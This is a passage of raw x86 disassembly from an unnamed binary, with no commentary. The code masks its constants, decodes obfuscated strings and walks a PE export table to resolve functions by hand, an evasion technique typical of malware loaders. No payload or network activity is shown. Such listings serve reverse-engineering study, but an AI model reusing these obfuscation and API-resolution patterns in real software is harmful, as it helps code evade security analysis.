  422143:	mov    WORD PTR [ebp-0x4],di
  422147:	mov    edi,DWORD PTR [ebp-0xc]
  42214a:	mov    bx,WORD PTR [ebp+0x8]
  42214e:	xor    edi,esi
  422150:	add    edi,eax
  422152:	cmp    bx,di
  422155:	jne    0x42206b
  42215b:	mov    eax,DWORD PTR [ebp-0x18]
  42215e:	mov    esi,DWORD PTR [ebp-0xc]
  422161:	xor    eax,ecx
  422163:	add    eax,edx
  422165:	imul   eax,esi
  422168:	mov    DWORD PTR [ebp-0xc],eax
  42216b:	jmp    0x42217f
  42216d:	mov    eax,DWORD PTR [ebp-0xc]
  422170:	mov    esi,DWORD PTR [ebp-0x18]
  422173:	xor    eax,ecx
  422175:	lea    eax,[eax+esi*1+0x3272fa]
  42217c:	mov    DWORD PTR [ebp-0x18],eax
  42217f:	mov    eax,DWORD PTR [ebp-0x24]
  422182:	sub    eax,edx
  422184:	xor    eax,ecx
  422186:	mov    DWORD PTR [ebp-0x30],eax
  422189:	mov    eax,DWORD PTR [ebp-0x28]
  42218c:	sub    eax,edx
  42218e:	xor    eax,ecx
  422190:	mov    DWORD PTR [ebp-0x34],eax
  422193:	mov    eax,DWORD PTR [ebp-0x34]
  422196:	mov    esi,DWORD PTR [ebp-0x1c]
  422199:	xor    esi,ecx
  42219b:	add    esi,edx
  42219d:	xor    eax,ecx
  42219f:	add    eax,0x3272fa
  4221a4:	imul   esi,eax
  4221a7:	mov    eax,DWORD PTR [ebp-0x14]
  4221aa:	movzx  eax,WORD PTR [esi+eax*1]
  4221ae:	mov    esi,DWORD PTR [ebp-0x30]
  4221b1:	mov    edi,DWORD PTR [ebp-0x1c]
  4221b4:	xor    esi,ecx
  4221b6:	add    esi,edx
  4221b8:	xor    edi,ecx
  4221ba:	add    edi,edx
  4221bc:	imul   edi,esi
  4221bf:	mov    esi,DWORD PTR [ebp-0x10]
  4221c2:	movzx  esi,WORD PTR [edi+esi*1]
  4221c6:	sub    eax,edx
  4221c8:	sub    esi,edx
  4221ca:	xor    eax,ecx
  4221cc:	xor    esi,ecx
  4221ce:	cmp    esi,eax
  4221d0:	jne    0x4221fb
  4221d2:	mov    eax,DWORD PTR [ebp-0x30]
  4221d5:	mov    esi,DWORD PTR [ebp-0x1c]
  4221d8:	xor    eax,ecx
  4221da:	add    eax,0x3272fa
  4221df:	xor    esi,ecx
  4221e1:	add    esi,edx
  4221e3:	imul   esi,eax
  4221e6:	mov    eax,DWORD PTR [ebp-0x10]
  4221e9:	movzx  eax,WORD PTR [esi+eax*1]
  4221ed:	mov    esi,DWORD PTR [ebp-0xc]
  4221f0:	sub    eax,edx
  4221f2:	xor    eax,ecx
  4221f4:	cmp    eax,esi
  4221f6:	mov    eax,DWORD PTR [ebp-0xc]
  4221f9:	je     0x4221fe
  4221fb:	mov    eax,DWORD PTR [ebp-0x18]
  4221fe:	pop    edi
  4221ff:	xor    eax,ecx
  422201:	pop    esi
  422202:	add    eax,edx
  422204:	pop    ebx
  422205:	leave  
  422206:	ret    0x8
  422209:	push   ebp
  42220a:	mov    ebp,esp
  42220c:	push   ecx
  42220d:	mov    cx,WORD PTR [eax]
  422210:	push   esi
  422211:	mov    esi,0x3b5f
  422216:	sub    cx,si
  422219:	mov    esi,0x8a9d
  42221e:	xor    cx,si
  422221:	mov    esi,0x4e3c
  422226:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  42222d:	mov    edx,0xf89c85b5
  422232:	cmp    cx,si
  422235:	je     0x422294
  422237:	push   ebx
  422238:	push   edi
  422239:	movzx  ecx,cx
  42223c:	mov    edi,0xffcd8d06
  422241:	mov    esi,0x75108b3
  422246:	mov    ebx,0x4e60
  42224b:	cmp    cx,bx
  42224e:	jne    0x422253
  422250:	mov    DWORD PTR [ebp-0x4],edx
  422253:	lea    edx,[edi+0x1]
  422256:	xor    edx,esi
  422258:	mov    edi,edx
  42225a:	xor    edi,esi
  42225c:	mov    cx,WORD PTR [eax+edi*2+0x64e5f4]
  422264:	mov    ebx,0x3b5f
  422269:	sub    cx,bx
  42226c:	mov    ebx,0x8a9d
  422271:	xor    cx,bx
  422274:	mov    ebx,0x4e3c
  422279:	cmp    cx,bx
  42227c:	jne    0x422246
  42227e:	mov    ecx,DWORD PTR [ebp-0x4]
  422281:	pop    edi
  422282:	pop    ebx
  422283:	cmp    ecx,0xf89c85b6
  422289:	je     0x422294
  42228b:	xor    ecx,esi
  42228d:	lea    eax,[eax+ecx*2+0x64e5f6]
  422294:	pop    esi
  422295:	leave  
  422296:	ret    
  422297:	push   ebp
  422298:	mov    ebp,esp
  42229a:	push   ecx
  42229b:	push   esi
  42229c:	push   edi
  42229d:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  4222a4:	mov    esi,0xf89c85b5
  4222a9:	call   0x422209
  4222ae:	mov    edi,eax
  4222b0:	mov    al,BYTE PTR [edi]
  4222b2:	sub    al,0x6
  4222b4:	xor    al,0x81
  4222b6:	cmp    al,0x7b
  4222b8:	je     0x42231b
  4222ba:	mov    eax,edi
  4222bc:	mov    edx,0xffcd8d06
  4222c1:	mov    ecx,0x75108b3
  4222c6:	push   ebx
  4222c7:	mov    ax,WORD PTR [eax]
  4222ca:	mov    ebx,0x3b5f
  4222cf:	sub    ax,bx
  4222d2:	mov    ebx,0x8a9d
  4222d7:	xor    ax,bx
  4222da:	mov    ebx,0x4e52
  4222df:	cmp    ax,bx
  4222e2:	jne    0x4222e7
  4222e4:	mov    DWORD PTR [ebp-0x4],esi
  4222e7:	lea    esi,[edx+0x1]
  4222ea:	xor    esi,ecx
  4222ec:	mov    edx,esi
  4222ee:	xor    edx,ecx
  4222f0:	lea    eax,[edi+edx*2+0x64e5f4]
  4222f7:	mov    bl,BYTE PTR [eax]
  4222f9:	sub    bl,0x6
  4222fc:	xor    bl,0x81
  4222ff:	cmp    bl,0x7b
  422302:	jne    0x4222c7
  422304:	mov    eax,DWORD PTR [ebp-0x4]
  422307:	pop    ebx
  422308:	cmp    eax,0xf89c85b6
  42230d:	je     0x42231b
  42230f:	xor    eax,ecx
  422311:	xor    ecx,ecx
  422313:	mov    WORD PTR [edi+eax*2+0x64e5f4],cx
  42231b:	mov    eax,edi
  42231d:	pop    edi
  42231e:	pop    esi
  42231f:	leave  
  422320:	ret    
  422321:	push   ebp
  422322:	mov    ebp,esp
  422324:	push   ecx
  422325:	push   esi
  422326:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  42232d:	mov    esi,0xf89c85b5
  422332:	call   0x422209
  422337:	mov    cx,WORD PTR [eax]
  42233a:	mov    edx,0x3b5f
  42233f:	sub    cx,dx
  422342:	mov    edx,0x8a9d
  422347:	xor    cx,dx
  42234a:	mov    edx,0x4e3c
  42234f:	cmp    cx,dx
  422352:	je     0x4223ab
  422354:	push   ebx
  422355:	push   edi
  422356:	movzx  ecx,cx
  422359:	mov    edx,0xffcd8d06
  42235e:	mov    edi,0x75108b3
  422363:	mov    ebx,0x4e52
  422368:	cmp    cx,bx
  42236b:	jne    0x422370
  42236d:	mov    DWORD PTR [ebp-0x4],esi
  422370:	lea    esi,[edx+0x1]
  422373:	xor    esi,edi
  422375:	mov    edx,esi
  422377:	xor    edx,edi
  422379:	mov    cx,WORD PTR [eax+edx*2+0x64e5f4]
  422381:	mov    ebx,0x3b5f
  422386:	sub    cx,bx
  422389:	mov    ebx,0x8a9d
  42238e:	xor    cx,bx
  422391:	mov    ebx,0x4e3c
  422396:	cmp    cx,bx
  422399:	jne    0x422363
  42239b:	cmp    DWORD PTR [ebp-0x4],0xf89c85b6
  4223a2:	pop    edi
  4223a3:	pop    ebx
  4223a4:	je     0x4223ab
  4223a6:	xor    eax,eax
  4223a8:	inc    eax
  4223a9:	jmp    0x4223ad
  4223ab:	xor    eax,eax
  4223ad:	pop    esi
  4223ae:	leave  
  4223af:	ret    
  4223b0:	push   ebp
  4223b1:	mov    ebp,esp
  4223b3:	push   ecx
  4223b4:	mov    eax,DWORD PTR [ebp+0x8]
  4223b7:	movzx  ecx,WORD PTR [eax]
  4223ba:	push   esi
  4223bb:	lea    eax,[ecx-0x3b5f]
  4223c1:	mov    esi,0x8a9d
  4223c6:	push   edi
  4223c7:	xor    eax,esi
  4223c9:	mov    edi,0x4e3c
  4223ce:	mov    DWORD PTR [ebp-0x4],edx
  4223d1:	cmp    ax,di
  4223d4:	je     0x422401
  4223d6:	mov    eax,DWORD PTR [ebp+0x8]
  4223d9:	sub    eax,edx
  4223db:	mov    DWORD PTR [ebp+0x8],eax
  4223de:	jmp    0x4223e3
  4223e0:	mov    eax,DWORD PTR [ebp+0x8]
  4223e3:	mov    WORD PTR [edx],cx
  4223e6:	add    edx,0x2
  4223e9:	movzx  edi,WORD PTR [eax+edx*1]
  4223ed:	mov    ecx,edi
  4223ef:	add    edi,0xffffc4a1
  4223f5:	xor    edi,esi
  4223f7:	mov    eax,0x4e3c
  4223fc:	cmp    di,ax
  4223ff:	jne    0x4223e0
  422401:	xor    eax,eax
  422403:	pop    edi
  422404:	mov    WORD PTR [edx],ax
  422407:	mov    eax,DWORD PTR [ebp-0x4]
  42240a:	pop    esi
  42240b:	leave  
  42240c:	ret    0x4
  42240f:	push   ebp
  422410:	mov    ebp,esp
  422412:	sub    esp,0x18
  422415:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  42241c:	mov    DWORD PTR [ebp-0x18],0xf89c85b4
  422423:	mov    ecx,DWORD PTR [ebp-0x8]
  422426:	push   esi
  422427:	mov    eax,0x75108b3
  42242c:	xor    ecx,eax
  42242e:	mov    esi,0x3272fa
  422433:	add    ecx,esi
  422435:	mov    DWORD PTR [ebp-0x4],ecx
  422438:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  42243f:	mov    DWORD PTR [ebp-0x10],0xf89c85b9
  422446:	push   edi
  422447:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  42244e:	jmp    0x4224ef
  422453:	mov    ecx,DWORD PTR [ebp-0x4]
  422456:	mov    edx,DWORD PTR [ebp+0x10]
  422459:	sub    edx,ecx
  42245b:	mov    ecx,DWORD PTR [ebp-0xc]
  42245e:	xor    ecx,eax
  422460:	add    ecx,esi
  422462:	cmp    edx,ecx
  422464:	jbe    0x422481
  422466:	mov    edx,DWORD PTR [ebp-0x4]
  422469:	add    edx,DWORD PTR [ebp+0x8]
  42246c:	mov    ecx,DWORD PTR [ebp-0x4]
  42246f:	add    ecx,DWORD PTR [ebp+0xc]
  422472:	mov    edi,DWORD PTR [ecx]
  422474:	mov    DWORD PTR [edx],edi
  422476:	mov    ecx,DWORD PTR [ecx+0x4]
  422479:	mov    DWORD PTR [edx+0x4],ecx
  42247c:	mov    ecx,DWORD PTR [ebp-0xc]
  42247f:	jmp    0x4224ce
  422481:	mov    ecx,DWORD PTR [ebp-0x4]
  422484:	mov    edx,DWORD PTR [ebp+0x10]
  422487:	sub    edx,ecx
  422489:	mov    ecx,DWORD PTR [ebp-0x10]
  42248c:	xor    ecx,eax
  42248e:	add    ecx,esi
  422490:	cmp    edx,ecx
  422492:	mov    ecx,DWORD PTR [ebp-0x4]
  422495:	jbe    0x4224a9
  422497:	add    ecx,DWORD PTR [ebp+0x8]
  42249a:	mov    edx,DWORD PTR [ebp-0x4]
  42249d:	add    edx,DWORD PTR [ebp+0xc]
  4224a0:	mov    edx,DWORD PTR [edx]
  4224a2:	mov    DWORD PTR [ecx],edx
  4224a4:	mov    ecx,DWORD PTR [ebp-0x10]
  4224a7:	jmp    0x4224ce
  4224a9:	mov    edx,DWORD PTR [ebp+0x10]
  4224ac:	sub    edx,ecx
  4224ae:	mov    ecx,DWORD PTR [ebp-0x14]
  4224b1:	xor    ecx,eax
  4224b3:	add    ecx,esi
  4224b5:	cmp    edx,ecx
  4224b7:	mov    ecx,DWORD PTR [ebp-0x4]
  4224ba:	jbe    0x4224df
  4224bc:	add    ecx,DWORD PTR [ebp+0x8]
  4224bf:	mov    edx,DWORD PTR [ebp-0x4]
  4224c2:	add    edx,DWORD PTR [ebp+0xc]
  4224c5:	mov    dx,WORD PTR [edx]
  4224c8:	mov    WORD PTR [ecx],dx
  4224cb:	mov    ecx,DWORD PTR [ebp-0x14]
  4224ce:	mov    edx,DWORD PTR [ebp-0x4]
  4224d1:	xor    ecx,eax
  4224d3:	lea    ecx,[ecx+edx*1+0x3272fa]
  4224da:	mov    DWORD PTR [ebp-0x4],ecx
  4224dd:	jmp    0x4224ef
  4224df:	add    ecx,DWORD PTR [ebp+0x8]
  4224e2:	mov    edx,DWORD PTR [ebp-0x4]
  4224e5:	add    edx,DWORD PTR [ebp+0xc]
  4224e8:	mov    dl,BYTE PTR [edx]
  4224ea:	mov    BYTE PTR [ecx],dl
  4224ec:	inc    DWORD PTR [ebp-0x4]
  4224ef:	mov    ecx,DWORD PTR [ebp-0x18]
  4224f2:	mov    edx,DWORD PTR [ebp+0x10]
  4224f5:	xor    ecx,eax
  4224f7:	add    ecx,esi
  4224f9:	imul   ecx,edx
  4224fc:	mov    edx,DWORD PTR [ebp-0x8]
  4224ff:	mov    edi,DWORD PTR [ebp-0x4]
  422502:	xor    edx,eax
  422504:	lea    edx,[edx+edi*1+0x3272fa]
  42250b:	cmp    edx,ecx
  42250d:	jb     0x422453
  422513:	pop    edi
  422514:	pop    esi
  422515:	leave  
  422516:	ret    0xc
  422519:	push   ebp
  42251a:	mov    ebp,esp
  42251c:	sub    esp,0xc
  42251f:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  422526:	push   esi
  422527:	mov    esi,eax
  422529:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  422530:	mov    edx,DWORD PTR [ebp-0x4]
  422533:	mov    eax,0x75108b3
  422538:	xor    edx,eax
  42253a:	mov    ecx,0x3272fa
  42253f:	add    edx,ecx
  422541:	cmp    esi,edx
  422543:	je     0x422585
  422545:	push   ebx
  422546:	push   edi
  422547:	mov    edx,DWORD PTR [ebp-0x8]
  42254a:	mov    ebx,DWORD PTR [ebp+0x8]
  42254d:	xor    edx,eax
  42254f:	mov    edi,0xffcd8d06
  422554:	sub    edi,edx
  422556:	add    esi,edi
  422558:	lea    edx,[esi-0x3272fa]
  42255e:	xor    edx,eax
  422560:	mov    DWORD PTR [ebp-0xc],edx
  422563:	mov    edx,DWORD PTR [ebp-0x4]
  422566:	mov    edi,DWORD PTR [ebp-0xc]
  422569:	xor    dl,0xb3
  42256c:	sub    dl,0x6
  42256f:	xor    edi,eax
  422571:	mov    BYTE PTR [edi+ebx*1+0x3272fa],dl
  422578:	mov    edx,DWORD PTR [ebp-0x4]
  42257b:	xor    edx,eax
  42257d:	add    edx,ecx
  42257f:	cmp    esi,edx
  422581:	jne    0x422547
  422583:	pop    edi
  422584:	pop    ebx
  422585:	pop    esi
  422586:	leave  
  422587:	ret    0x4
  42258a:	push   ebp
  42258b:	mov    ebp,esp
  42258d:	sub    esp,0x21c
  422593:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  42259a:	mov    DWORD PTR [ebp-0x14],0xf89c85b4
  4225a1:	mov    eax,DWORD PTR [ebp+0x10]
  4225a4:	mov    eax,DWORD PTR [ebp-0x4]
  4225a7:	mov    ecx,DWORD PTR [ebp+0x8]
  4225aa:	push   esi
  4225ab:	push   edi
  4225ac:	mov    edi,0x75108b3
  4225b1:	xor    eax,edi
  4225b3:	mov    esi,0x3272fa
  4225b8:	add    eax,esi
  4225ba:	cmp    eax,ecx
  4225bc:	mov    eax,DWORD PTR [ebp-0x4]
  4225bf:	jne    0x4225ca
  4225c1:	xor    eax,edi
  4225c3:	add    eax,esi
  4225c5:	jmp    0x422676
  4225ca:	mov    ecx,DWORD PTR [ebp+0xc]
  4225cd:	xor    eax,edi
  4225cf:	add    eax,esi
  4225d1:	cmp    eax,ecx
  4225d3:	jne    0x4225da
  4225d5:	mov    eax,DWORD PTR [ebp-0x4]
  4225d8:	jmp    0x4225c1
  4225da:	lea    eax,[ebp-0x21c]
  4225e0:	mov    DWORD PTR [ebp-0x8],eax
  4225e3:	mov    eax,DWORD PTR [ebp+0xc]
  4225e6:	mov    DWORD PTR [ebp-0x10],eax
  4225e9:	mov    eax,DWORD PTR [ebp-0x4]
  4225ec:	xor    eax,edi
  4225ee:	add    eax,esi
  4225f0:	mov    DWORD PTR [ebp+0x10],eax
  4225f3:	mov    eax,DWORD PTR [ebp+0xc]
  4225f6:	push   ebx
  4225f7:	call   0x422321
  4225fc:	mov    ebx,eax
  4225fe:	mov    eax,DWORD PTR [ebp+0x8]
  422601:	mov    eax,DWORD PTR [eax+0x14]
  422604:	jmp    0x42265e
  422606:	mov    eax,DWORD PTR [ebp+0xc]
  422609:	sub    eax,0x8
  42260c:	mov    DWORD PTR [ebp-0xc],eax
  42260f:	mov    eax,DWORD PTR [ebp-0xc]
  422612:	mov    eax,DWORD PTR [eax+0x28]
  422615:	call   0x422209
  42261a:	mov    DWORD PTR [ebp+0x10],eax
  42261d:	push   DWORD PTR [ebp+0x10]
  422620:	mov    edx,DWORD PTR [ebp-0x8]
  422623:	call   0x4223b0
  422628:	mov    eax,DWORD PTR [ebp-0x4]
  42262b:	xor    eax,edi
  42262d:	add    eax,esi
  42262f:	cmp    eax,ebx
  422631:	jne    0x42263b
  422633:	mov    eax,DWORD PTR [ebp-0x8]
  422636:	call   0x422297
  42263b:	mov    eax,DWORD PTR [ebp-0x14]
  42263e:	xor    eax,edi
  422640:	add    eax,esi
  422642:	push   eax
  422643:	push   DWORD PTR [ebp-0x10]
  422646:	mov    eax,DWORD PTR [ebp-0x8]
  422649:	call   0x421fc3
  42264e:	mov    ecx,DWORD PTR [ebp-0x4]
  422651:	xor    ecx,edi
  422653:	add    ecx,esi
  422655:	cmp    eax,ecx
  422657:	je     0x42267c
  422659:	mov    eax,DWORD PTR [ebp+0xc]
  42265c:	mov    eax,DWORD PTR [eax]
  42265e:	mov    DWORD PTR [ebp+0xc],eax
  422661:	mov    eax,DWORD PTR [ebp+0x8]
  422664:	mov    ecx,DWORD PTR [ebp+0xc]
  422667:	add    eax,0x14
  42266a:	cmp    ecx,eax
  42266c:	jne    0x422606
  42266e:	mov    eax,DWORD PTR [ebp-0x4]
  422671:	xor    eax,edi
  422673:	add    eax,esi
  422675:	pop    ebx
  422676:	pop    edi
  422677:	pop    esi
  422678:	leave  
  422679:	ret    0xc
  42267c:	mov    eax,DWORD PTR [ebp-0xc]
  42267f:	mov    eax,DWORD PTR [eax+0x18]
  422682:	jmp    0x422675
  422684:	push   ebp
  422685:	mov    ebp,esp
  422687:	mov    eax,DWORD PTR [ebp+0xc]
  42268a:	sub    esp,0x10
  42268d:	cmp    DWORD PTR [ebp+0x8],0x0
  422691:	push   ebx
  422692:	push   esi
  422693:	push   edi
  422694:	je     0x422749
  42269a:	test   eax,eax
  42269c:	je     0x422749
  4226a2:	movzx  eax,WORD PTR [eax+0x20]
  4226a6:	mov    ecx,eax
  4226a8:	mov    DWORD PTR [ebp-0x10],eax
  4226ab:	xor    edx,edx
  4226ad:	and    DWORD PTR [ebp-0x8],edx
  4226b0:	mov    eax,0x8a9d
  4226b5:	xor    ecx,eax
  4226b7:	add    ecx,0x3b5f
  4226bd:	mov    DWORD PTR [ebp-0xc],ecx
  4226c0:	and    DWORD PTR [ebp-0x4],0x0
  4226c4:	xor    ecx,ecx
  4226c6:	push   0x7d
  4226c8:	pop    edi
  4226c9:	cmp    cx,WORD PTR [ebp-0xc]
  4226cd:	jae    0x422733
  4226cf:	lea    esi,[edx-0x3b5f]
  4226d5:	xor    esi,eax
  4226d7:	movzx  ecx,WORD PTR [ebp-0x4]
  4226db:	mov    ebx,DWORD PTR [ebp+0xc]
  4226de:	lea    ecx,[ebx+ecx*4]
  4226e1:	cmp    WORD PTR [ecx+0x2],si
  4226e5:	jne    0x42271e
  4226e7:	movzx  ecx,WORD PTR [ecx]
  4226ea:	mov    edi,0x4e3c
  4226ef:	cmp    cx,di
  4226f2:	jne    0x422700
  4226f4:	mov    ebx,DWORD PTR [ebp+0x8]
  4226f7:	movzx  edi,dx
  4226fa:	cmp    BYTE PTR [edi+ebx*1],0x0
  4226fe:	je     0x42272d
  422700:	mov    ebx,DWORD PTR [ebp+0x8]
  422703:	movzx  edi,dx
  422706:	movsx  di,BYTE PTR [edi+ebx*1]
  42270b:	mov    ebx,0x3b5f
  422710:	sub    di,bx
  422713:	xor    di,ax
  422716:	cmp    cx,di
  422719:	je     0x42272d
  42271b:	push   0x7b
  42271d:	pop    edi
  42271e:	inc    DWORD PTR [ebp-0x4]
  422721:	mov    cx,WORD PTR [ebp-0xc]
  422725:	cmp    WORD PTR [ebp-0x4],cx
  422729:	jb     0x4226d7
  42272b:	jmp    0x422733
  42272d:	inc    DWORD PTR [ebp-0x8]
  422730:	push   0x7a
  422732:	pop    edi
  422733:	mov    esi,DWORD PTR [ebp+0x8]
  422736:	movzx  ecx,dx
  422739:	cmp    BYTE PTR [ecx+esi*1],0x0
  42273d:	je     0x422752
  42273f:	inc    edx
  422740:	cmp    edi,0x7b
  422743:	jne    0x4226c0
  422749:	xor    eax,eax
  42274b:	pop    edi
  42274c:	pop    esi
  42274d:	pop    ebx
  42274e:	leave  
  42274f:	ret    0x8
  422752:	mov    ecx,DWORD PTR [ebp-0x8]
  422755:	add    ecx,0xffffc4a1
  42275b:	xor    cx,ax
  42275e:	xor    eax,eax
  422760:	cmp    cx,WORD PTR [ebp-0x10]
  422764:	sete   al
  422767:	jmp    0x42274b
  422769:	push   ebp
  42276a:	mov    ebp,esp
  42276c:	sub    esp,0x50
  42276f:	push   edi
  422770:	mov    edi,eax
  422772:	mov    eax,DWORD PTR [edi+0x1a8]
  422778:	cmp    DWORD PTR [eax],0x0
  42277b:	jne    0x422784
  42277d:	xor    eax,eax
  42277f:	jmp    0x4228b5
  422784:	push   DWORD PTR [ebp+0x8]
  422787:	push   0x2c
  422789:	pop    eax
  42278a:	call   0x422519
  42278f:	mov    edx,DWORD PTR [edi+0x1ac]
  422795:	lea    eax,[edi+0x22]
  422798:	mov    DWORD PTR [ebp-0x4c],eax
  42279b:	lea    eax,[edi+0x44]
  42279e:	mov    DWORD PTR [ebp-0x48],eax
  4227a1:	lea    eax,[edi+0x66]
  4227a4:	mov    DWORD PTR [ebp-0x44],eax
  4227a7:	lea    eax,[edi+0x88]
  4227ad:	mov    DWORD PTR [ebp-0x40],eax
  4227b0:	lea    eax,[edi+0xaa]
  4227b6:	mov    DWORD PTR [ebp-0x3c],eax
  4227b9:	lea    eax,[edi+0xcc]
  4227bf:	mov    DWORD PTR [ebp-0x38],eax
  4227c2:	lea    eax,[edi+0xee]
  4227c8:	mov    DWORD PTR [ebp-0x34],eax
  4227cb:	lea    eax,[edi+0x110]
  4227d1:	mov    DWORD PTR [ebp-0x30],eax
  4227d4:	lea    eax,[edi+0x132]
  4227da:	mov    DWORD PTR [ebp-0x2c],eax
  4227dd:	lea    eax,[edi+0x154]
  4227e3:	push   edi
  4227e4:	mov    DWORD PTR [ebp-0x50],edi
  4227e7:	mov    DWORD PTR [ebp-0x28],eax
  4227ea:	call   0x4228e9
  4227ef:	push   eax
  4227f0:	mov    eax,DWORD PTR [edi+0x1a8]
  4227f6:	push   DWORD PTR [eax]
  4227f8:	call   0x42258a
  4227fd:	mov    DWORD PTR [ebp-0x10],eax
  422800:	test   eax,eax
  422802:	je     0x4228b5
  422808:	mov    ecx,DWORD PTR [eax+0x3c]
  42280b:	push   ebx
  42280c:	push   esi
  42280d:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  422811:	add    esi,eax
  422813:	mov    edi,DWORD PTR [esi+0x24]
  422816:	mov    ecx,DWORD PTR [esi+0x1c]
  422819:	mov    edx,DWORD PTR [esi+0x20]
  42281c:	mov    ebx,DWORD PTR [esi+0x18]
  42281f:	add    edi,eax
  422821:	mov    DWORD PTR [ebp-0x20],edi
  422824:	mov    edi,DWORD PTR [esi+0x14]
  422827:	add    ecx,eax
  422829:	add    edx,eax
  42282b:	mov    DWORD PTR [ebp-0xc],ecx
  42282e:	mov    DWORD PTR [ebp-0x1c],edx
  422831:	mov    DWORD PTR [ebp-0x8],edi
  422834:	cmp    edi,ebx
  422836:	ja     0x42283b
  422838:	mov    DWORD PTR [ebp-0x8],ebx
  42283b:	xor    ebx,ebx
  42283d:	mov    DWORD PTR [ebp-0x18],ebx
  422840:	cmp    DWORD PTR [ebp-0x8],ebx
  422843:	jbe    0x4228b3
  422845:	jmp    0x42284a
  422847:	mov    edx,DWORD PTR [ebp-0x1c]
  42284a:	mov    edi,DWORD PTR [ebp-0x20]
  42284d:	movzx  edi,WORD PTR [edi+ebx*2]
  422851:	cmp    ebx,DWORD PTR [esi+0x18]
  422854:	jae    0x4228b3
  422856:	cmp    edi,DWORD PTR [esi+0x14]
  422859:	jae    0x4228b3
  42285b:	mov    ebx,DWORD PTR [edx+ebx*4]
  42285e:	mov    edx,DWORD PTR [ebp+0x8]
  422861:	mov    edi,DWORD PTR [ecx+edi*4]
  422864:	mov    DWORD PTR [ebp-0x4],edx
  422867:	lea    edx,[ebp-0x50]
  42286a:	add    ebx,eax
  42286c:	add    edi,eax
  42286e:	sub    edx,DWORD PTR [ebp+0x8]
  422871:	mov    DWORD PTR [ebp-0x14],0xb
  422878:	mov    DWORD PTR [ebp-0x24],edx
  42287b:	mov    edx,DWORD PTR [ebp-0x4]
  42287e:	cmp    DWORD PTR [edx],0x0
  422881:	jne    0x42289e
  422883:	mov    eax,DWORD PTR [ebp-0x24]
  422886:	push   DWORD PTR [eax+edx*1]
  422889:	push   ebx
  42288a:	call   0x422684
  42288f:	mov    ecx,DWORD PTR [ebp-0xc]
  422892:	test   eax,eax
  422894:	je     0x42289b
  422896:	mov    eax,DWORD PTR [ebp-0x4]
  422899:	mov    DWORD PTR [eax],edi
  42289b:	mov    eax,DWORD PTR [ebp-0x10]
  42289e:	add    DWORD PTR [ebp-0x4],0x4
  4228a2:	dec    DWORD PTR [ebp-0x14]
  4228a5:	jne    0x42287b
  4228a7:	mov    ebx,DWORD PTR [ebp-0x18]
  4228aa:	inc    ebx
  4228ab:	mov    DWORD PTR [ebp-0x18],ebx
  4228ae:	cmp    ebx,DWORD PTR [ebp-0x8]
  4228b1:	jb     0x422847
  4228b3:	pop    esi
  4228b4:	pop    ebx
  4228b5:	pop    edi
  4228b6:	leave  
  4228b7:	ret    0x4
  4228ba:	push   ebp
  4228bb:	mov    ebp,esp
  4228bd:	mov    eax,DWORD PTR [ebp+0x8]
  4228c0:	push   esi
  4228c1:	push   DWORD PTR [eax+0x1e0]
  4228c7:	lea    esi,[eax+0x198]
  4228cd:	mov    eax,DWORD PTR [ebp+0x8]
  4228d0:	call   0x422769
  4228d5:	mov    ecx,DWORD PTR [esi]
  4228d7:	mov    DWORD PTR [ecx],eax
  4228d9:	mov    eax,DWORD PTR [esi]
  4228db:	xor    ecx,ecx
  4228dd:	cmp    DWORD PTR [eax],ecx
  4228df:	pop    esi
  4228e0:	setne  cl
  4228e3:	mov    eax,ecx
  4228e5:	pop    ebp
  4228e6:	ret    0x4
  4228e9:	mov    ecx,DWORD PTR [edi+0x188]
  4228ef:	push   ebx
  4228f0:	jmp    0x422905
  4228f2:	xor    eax,0x8a9d
  4228f7:	add    eax,0x3b5f
  4228fc:	mov    WORD PTR [ecx],ax
  4228ff:	add    ecx,0x2
  422902:	add    edx,0x2
  422905:	movzx  eax,WORD PTR [edx]
  422908:	mov    ebx,0x4e3c
  42290d:	cmp    ax,bx
  422910:	jne    0x4228f2
  422912:	xor    eax,eax
  422914:	mov    WORD PTR [ecx],ax
  422917:	mov    eax,DWORD PTR [edi+0x188]
  42291d:	pop    ebx
  42291e:	ret    
  42291f:	push   edi
  422920:	mov    edi,eax
  422922:	mov    eax,DWORD PTR [esi+0x188]
  422928:	shl    edi,0x6
  42292b:	add    eax,edi
  42292d:	jmp    0x422939
  42292f:	xor    cl,0x81
  422932:	add    cl,0x6
  422935:	mov    BYTE PTR [eax],cl
  422937:	inc    eax
  422938:	inc    edx
  422939:	mov    cl,BYTE PTR [edx]
  42293b:	cmp    cl,0x7b
  42293e:	jne    0x42292f
  422940:	mov    BYTE PTR [eax],0x0
  422943:	mov    eax,DWORD PTR [esi+0x188]
  422949:	add    eax,edi
  42294b:	pop    edi
  42294c:	ret    
  42294d:	push   ebp
  42294e:	mov    ebp,esp
  422950:	sub    esp,0x14
  422953:	mov    DWORD PTR [ebp-0x10],0xf89c85b5
  42295a:	mov    DWORD PTR [ebp-0x4],0xf89c85b4
  422961:	mov    eax,DWORD PTR [ebx]
  422963:	mov    DWORD PTR [ebp-0x8],eax
  422966:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  42296d:	push   esi
  42296e:	push   edi
  42296f:	mov    DWORD PTR [ebp-0x14],0xead71895
  422976:	mov    edi,DWORD PTR [ebp-0x4]
  422979:	mov    ecx,DWORD PTR [ebp-0x10]
  42297c:	mov    eax,0x75108b3
  422981:	xor    edi,eax
  422983:	mov    edx,0x3272fa
  422988:	xor    ecx,eax
  42298a:	add    edi,edx
  42298c:	add    ecx,edx
  42298e:	imul   edi,ecx
  422991:	jmp    0x4229d9
  422993:	mov    ecx,DWORD PTR [ebp-0x8]
  422996:	mov    esi,DWORD PTR [ebp-0x4]
  422999:	xor    ecx,eax
  42299b:	xor    esi,eax
  42299d:	add    ecx,edx
  42299f:	add    esi,edx
  4229a1:	test   esi,ecx
  4229a3:	mov    esi,DWORD PTR [ebp-0x8]
  4229a6:	mov    ecx,DWORD PTR [ebp-0x4]
  4229a9:	je     0x4229c0
  4229ab:	xor    ecx,eax
  4229ad:	xor    esi,eax
  4229af:	add    ecx,edx
  4229b1:	add    esi,edx
  4229b3:	shr    esi,cl
